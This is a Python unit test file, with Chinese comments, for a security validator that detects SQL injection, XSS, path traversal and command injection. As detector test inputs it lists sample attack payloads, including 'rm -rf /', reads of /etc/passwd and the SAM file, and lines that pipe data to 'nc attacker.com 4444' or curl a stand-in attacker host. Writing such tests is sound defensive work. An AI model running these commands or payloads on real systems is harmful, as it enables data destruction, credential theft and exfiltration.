"""
测试安全验证器模块
"""
import pytest
from core.security_validator import SecurityValidator


@pytest.mark.unit
class TestSecurityValidator:
    """SecurityValidator 单元测试"""

    def test_validator_initialization(self):
        """测试验证器初始化"""
        validator = SecurityValidator()
        assert validator is not None
        assert hasattr(validator, "validate_input")

    def test_detect_sql_injection(self):
        """测试 SQL 注入检测"""
        validator = SecurityValidator()

        # SQL 注入测试用例
        sql_injection_patterns = [
            "1' OR '1'='1",
            "1; DROP TABLE users--",
            "admin'--",
            "' UNION SELECT * FROM users--",
            "1' AND 1=1--",
        ]

        for pattern in sql_injection_patterns:
            result = validator.validate_input(pattern)
            assert result["is_malicious"] is True
            assert "sql_injection" in result["threat_types"]

    def test_detect_xss(self):
        """测试 XSS 攻击检测"""
        validator = SecurityValidator()

        # XSS 测试用例
        xss_patterns = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(XSS)'>",
        ]

        for pattern in xss_patterns:
            result = validator.validate_input(pattern)
            assert result["is_malicious"] is True
            assert "xss" in result["threat_types"]

    def test_detect_path_traversal(self):
        """测试路径遍历攻击检测"""
        validator = SecurityValidator()

        # 路径遍历测试用例
        path_traversal_patterns = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "....//....//....//etc/passwd",
        ]

        for pattern in path_traversal_patterns:
            result = validator.validate_input(pattern)
            assert result["is_malicious"] is True
            assert "path_traversal" in result["threat_types"]

    def test_detect_command_injection(self):
        """测试命令注入检测"""
        validator = SecurityValidator()

        # 命令注入测试用例
        command_injection_patterns = [
            "file.txt; rm -rf /",
            "data && cat /etc/passwd",
            "input | nc attacker.com 4444",
            "file.txt; curl attacker.com",
            "data `whoami`",
        ]

        for pattern in command_injection_patterns:
            result = validator.validate_input(pattern)
            assert result["is_malicious"] is True

    def test_validate_safe_input(self):
        """测试安全输入验证"""
        validator = SecurityValidator()

        safe_inputs = [
            "normal_user",
            "/api/users/123",
            "test@example.com",
            "Hello World!",
            "user123",
        ]

        for input_str in safe_inputs:
            result = validator.validate_input(input_str)
            assert result["is_malicious"] is False
            assert result["risk_score"] < 5.0

    def test_sanitization(self):
        """测试输入净化"""
        validator = SecurityValidator()

        malicious_input = "<script>alert('XSS')</script>"
        sanitized = validator.sanitize_input(malicious_input)

        # 净化后的输入应该移除或转义危险字符
        assert "<script>" not in sanitized
        assert sanitized != malicious_input

    def test_risk_scoring(self):
        """测试风险评分"""
        validator = SecurityValidator()

        # 高风险输入
        high_risk = "1' OR '1'='1; DROP TABLE users--"
        result_high = validator.validate_input(high_risk)
        assert result_high["risk_score"] >= 7.0

        # 中等风险输入
        medium_risk = "<script>alert(1)</script>"
        result_medium = validator.validate_input(medium_risk)
        assert 5.0 <= result_medium["risk_score"] < 7.0

        # 低风险输入
        low_risk = "normal user input"
        result_low = validator.validate_input(low_risk)
        assert result_low["risk_score"] < 5.0

    def test_validation_levels(self):
        """测试不同验证级别"""
        # 严格模式
        strict_validator = SecurityValidator(validation_level="strict")
        result = strict_validator.validate_input("SELECT * FROM users")
        assert result["is_malicious"] is True  # 严格模式下会检测 SQL 关键字

        # 宽松模式
        lenient_validator = SecurityValidator(validation_level="lenient")
        result = lenient_validator.validate_input("SELECT * FROM users")
        # 宽松模式可能不会检测这种情况
        assert isinstance(result["is_malicious"], bool)

    def test_batch_validation(self):
        """测试批量验证"""
        validator = SecurityValidator()

        inputs = [
            "normal_input",
            "<script>alert('XSS')</script>",
            "another_safe_input",
            "../../../etc/passwd",
        ]

        results = validator.validate_batch(inputs)

        assert len(results) == len(inputs)
        assert results[0]["is_malicious"] is False
        assert results[1]["is_malicious"] is True
        assert results[2]["is_malicious"] is False
        assert results[3]["is_malicious"] is True

    def test_empty_input(self):
        """测试空输入处理"""
        validator = SecurityValidator()

        result = validator.validate_input("")
        assert result["is_malicious"] is False
        assert result["risk_score"] == 0.0

    def test_unicode_input(self):
        """测试 Unicode 输入处理"""
        validator = SecurityValidator()

        # Unicode 字符
        unicode_input = "用户输入<script>alert('XSS')</script>"
        result = validator.validate_input(unicode_input)
        assert result["is_malicious"] is True

    def test_very_long_input(self):
        """测试超长输入处理"""
        validator = SecurityValidator()

        long_input = "a" * 100000
        result = validator.validate_input(long_input)

        # 应该能够处理长输入而不崩溃
        assert isinstance(result, dict)

    def test_special_characters(self):
        """测试特殊字符处理"""
        validator = SecurityValidator()

        special_chars = "!@#$%^&*()_+-=[]{}|;':\",./<>?"
        result = validator.validate_input(special_chars)

        # 某些特殊字符可能被认为是危险的
        assert isinstance(result["is_malicious"], bool)


@pytest.mark.unit
class TestSecurityValidatorSessionManagement:
    """测试会话管理功能"""

    def test_generate_token(self):
        """测试令牌生成"""
        validator = SecurityValidator()

        token = validator.generate_session_token()
        assert token is not None
        assert len(token) > 0
        assert isinstance(token, str)

    def test_validate_token(self):
        """测试令牌验证"""
        validator = SecurityValidator()

        token = validator.generate_session_token()
        is_valid = validator.validate_session_token(token)

        assert is_valid is True

    def test_invalid_token(self):
        """测试无效令牌"""
        validator = SecurityValidator()

        is_valid = validator.validate_session_token("invalid_token_12345")
        assert is_valid is False

    def test_token_expiration(self):
        """测试令牌过期"""
        import time

        validator = SecurityValidator(token_ttl=1)  # 1秒过期

        token = validator.generate_session_token()
        assert validator.validate_session_token(token) is True

        time.sleep(2)
        assert validator.validate_session_token(token) is False


@pytest.mark.unit
class TestSecurityValidatorPerformance:
    """测试性能相关的安全验证"""

    def test_large_batch_validation(self):
        """测试大批量验证性能"""
        import time

        validator = SecurityValidator()

        # 生成10000个输入
        inputs = [f"input_{i}" for i in range(10000)]
        # 添加一些恶意输入
        inputs[100] = "<script>alert('XSS')</script>"
        inputs[5000] = "1' OR '1'='1"

        start_time = time.time()
        results = validator.validate_batch(inputs)
        elapsed_time = time.time() - start_time

        # 应该在合理时间内完成（< 5秒）
        assert elapsed_time < 5.0
        assert len(results) == 10000

    def test_cached_validation(self):
        """测试缓存性能"""
        import time

        validator = SecurityValidator(enable_cache=True)

        # 第一次验证
        start_time = time.time()
        validator.validate_input("test_input")
        first_time = time.time() - start_time

        # 第二次验证（应该使用缓存）
        start_time = time.time()
        validator.validate_input("test_input")
        second_time = time.time() - start_time

        # 第二次应该更快
        assert second_time < first_time
